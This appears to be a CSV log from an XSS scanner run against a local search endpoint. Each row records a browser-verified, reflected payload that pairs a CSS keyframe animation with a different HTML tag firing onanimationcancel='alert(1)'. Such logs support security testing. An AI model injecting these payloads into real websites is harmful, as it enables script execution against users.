Timestamp,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><area id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></area>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><article id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></article>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><aside id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></aside>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></audio>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><b id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></b>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><base id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></base>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><basefont id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></basefont>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdi id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdi>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bdo id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bdo>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></bgsound>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><big id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></big>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blink id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blink>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><blockquote id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></blockquote>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><body id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></body>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><br id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></br>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><button id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></button>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><canvas id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></canvas>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></caption>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><center id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></center>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><cite id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></cite>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></code>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><col id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></col>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><colgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></colgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><command id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></command>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><content id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></content>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><data id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></data>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><datalist id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></datalist>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dd>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><del id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></del>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><details id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></details>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dfn id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dfn>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dialog id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dialog>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dir id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dir>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><div id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dl id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dl>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></dt>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><element id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></element>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></em>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><fieldset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></fieldset>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figcaption id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figcaption>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></figure>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></font>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><footer id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></footer>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></form>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frame>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frameset id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></frameset>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><h1 id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></h1>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><head id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></head>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></header>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hgroup>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hr id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></hr>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><html id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></html>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></i>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><iframe id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></iframe>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></image>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><img id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></img>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 00:56:55,http://localhost:3000/search,GET,q,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><input id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></input>",RAW_REFLECTION,Yes,alert,Critical
